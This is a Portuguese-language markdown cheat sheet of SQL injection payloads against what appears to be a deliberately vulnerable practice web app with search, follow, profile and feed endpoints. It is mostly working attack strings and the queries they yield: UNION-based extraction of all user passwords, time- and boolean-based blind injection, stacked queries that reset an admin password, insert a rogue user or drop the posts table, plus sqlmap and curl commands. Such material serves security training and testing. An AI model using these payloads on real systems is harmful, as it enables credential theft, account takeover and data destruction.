# Payloads SQL Injection - Busca de Usuários e Sistema de Follow

Este documento contém exemplos de payloads SQL Injection específicos para as novas funcionalidades de busca e follow.

## 🔍 Busca de Usuários - SQL Injection

A busca de usuários é vulnerável a SQL Injection no parâmetro `q`.

### 1. Bypass de Busca - Retornar Todos os Usuários

**URL**:
```
/search/?q=%' OR '1'='1
```

**Query Resultante**:
```sql
SELECT id, username, email, bio FROM users 
WHERE (username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%')
AND id != 1
LIMIT 20
```

**Resultado**: Retorna todos os usuários do sistema.

---

### 2. Extração de Senhas com UNION

**URL**:
```
/search/?q=%' UNION SELECT id, username, password, email FROM users --
```

**Query Resultante**:
```sql
SELECT id, username, email, bio FROM users 
WHERE (username LIKE '%' UNION SELECT id, username, password, email FROM users --'%' OR email LIKE '%...')
AND id != 1
LIMIT 20
```

**Resultado**: Retorna senhas de todos os usuários.

---

### 3. Time-based Blind SQL Injection

**URL**:
```
/search/?q=%' AND SLEEP(5) --
```

**Comportamento**:
- Se a busca demora 5+ segundos, a query é vulnerável
- Permite confirmar a existência de SQL Injection mesmo sem feedback visual

---

### 4. Boolean-based Blind SQL Injection

**URL 1** (condição verdadeira):
```
/search/?q=%' AND 1=1 --
```

**URL 2** (condição falsa):
```
/search/?q=%' AND 1=2 --
```

**Comportamento**:
- URL 1: Retorna resultados
- URL 2: Retorna 0 resultados
- Permite inferir informações através do comportamento

---

### 5. Extração de Informações do Banco

**URL**:
```
/search/?q=%' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables --
```

**Resultado**: Lista todas as tabelas do banco de dados.

---

### 6. Descoberta de Colunas

**URL**:
```
/search/?q=%' ORDER BY 1 --
/search/?q=%' ORDER BY 2 --
/search/?q=%' ORDER BY 3 --
/search/?q=%' ORDER BY 4 --
/search/?q=%' ORDER BY 5 --
```

**Resultado**: Quando exceder o número de colunas, retorna erro.

---

## 👥 Sistema de Follow - SQL Injection

### 1. Follow Forçado com SQL Injection

**Localização**: URL `/follow/<user_id>/`

**Payload no user_id**:
```
/follow/1; UPDATE users SET password='hacked' WHERE id=1 --/
```

**Query Resultante**:
```sql
INSERT INTO follows (follower_id, following_id, created_at)
VALUES (1, 1; UPDATE users SET password='hacked' WHERE id=1 --, NOW())
```

**Nota**: Dependendo da implementação, pode executar múltiplas queries.

---

### 2. Manipulação de Dados no Follow

**Payload**:
```
/follow/1) ON DUPLICATE KEY UPDATE created_at=NOW(); DROP TABLE posts; --/
```

**Resultado**: Pode deletar tabelas ou modificar dados.

---

### 3. Extração de Informações via Follow

**Payload**:
```
/follow/1 UNION SELECT user_id, password FROM users --/
```

**Resultado**: Pode retornar dados sensíveis.

---

## 🔗 Perfil do Usuário - SQL Injection

### 1. Bypass de Perfil

**URL**:
```
/profile/admin' OR '1'='1 --/
```

**Query Resultante**:
```sql
SELECT id, username, email, bio, created_at FROM users 
WHERE username = 'admin' OR '1'='1 --'
```

**Resultado**: Retorna o perfil do primeiro usuário (geralmente admin).

---

### 2. Extração de Senhas via Perfil

**URL**:
```
/profile/' UNION SELECT id, username, password, email, created_at FROM users --/
```

**Resultado**: Retorna senhas de todos os usuários.

---

### 3. Time-based Blind no Perfil

**URL**:
```
/profile/admin' AND SLEEP(5) --/
```

**Comportamento**:
- Se o usuário existe: página demora 5+ segundos
- Se não existe: responde normalmente

---

## 📊 Feed - SQL Injection

### 1. Bypass de Seguimento

**Localização**: A query que busca postagens de quem você segue

**Payload** (se conseguir injetar no ID do usuário):
```
1 OR 1=1
```

**Resultado**: Mostra postagens de todos os usuários como "de quem você segue".

---

### 2. Extração de Dados do Feed

**Payload**:
```
1 UNION SELECT user_id, password, created_at, username, id, 1 FROM users --
```

**Resultado**: Retorna senhas de usuários no feed.

---

## 🎯 Técnicas Avançadas

### 1. Stacked Queries na Busca

**URL**:
```
/search/?q=%'; INSERT INTO users (username, password, email, bio, created_at, updated_at) VALUES ('hacker', 'senha', 'hacker@evil.com', 'Hacker', NOW(), NOW()); --
```

**Resultado**: Cria novo usuário administrativo.

---

### 2. Extração de Dados com Subconsultas

**URL**:
```
/search/?q=%' OR id IN (SELECT id FROM users WHERE password LIKE '%admin%') --
```

**Resultado**: Encontra usuários com senhas contendo "admin".

---

### 3. Manipulação de Timestamps

**URL**:
```
/follow/1' AND created_at = '2099-01-01' --/
```

**Resultado**: Pode manipular datas de criação.

---

## 🛡️ Detecção de Proteção

### Teste de Caracteres Bloqueados

Teste se os seguintes caracteres/palavras são bloqueados:
- `'` (aspas simples)
- `--` (comentário SQL)
- `UNION`
- `SELECT`
- `INSERT`
- `UPDATE`
- `DELETE`
- `DROP`
- `SLEEP`
- `LOAD_FILE`
- `INTO OUTFILE`

---

## 📋 Checklist de Testes

- [ ] Busca com `%' OR '1'='1`
- [ ] Busca com `UNION SELECT`
- [ ] Busca com `SLEEP(5)`
- [ ] Perfil com `admin' OR '1'='1`
- [ ] Perfil com `UNION SELECT`
- [ ] Follow com múltiplas queries
- [ ] Extração de senhas via busca
- [ ] Extração de senhas via perfil
- [ ] Time-based blind na busca
- [ ] Time-based blind no perfil
- [ ] Boolean-based blind na busca
- [ ] Descoberta de colunas com ORDER BY

---

## 🧪 Ferramentas Recomendadas

### SQLMap com Busca
```bash
sqlmap -u "http://localhost:8000/search/?q=test" -p q --dbs
```

### SQLMap com Perfil
```bash
sqlmap -u "http://localhost:8000/profile/test/" --dbs
```

### cURL para Testes Manuais
```bash
# Busca com SQL Injection
curl "http://localhost:8000/search/?q=%27%20OR%20%271%27=%271"

# Perfil com SQL Injection
curl "http://localhost:8000/profile/admin%27%20OR%20%271%27=%271%20--/"
```

---

## ⚠️ Avisos Importantes

1. **Ambiente Controlado**: Use apenas em ambientes autorizados de teste
2. **Documentação**: Documente todos os testes realizados
3. **Responsabilidade**: Reporte vulnerabilidades responsavelmente
4. **Educação**: Use para aprender, não para prejudicar

---

## 📚 Referências

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

---

**Última atualização**: Fevereiro de 2026
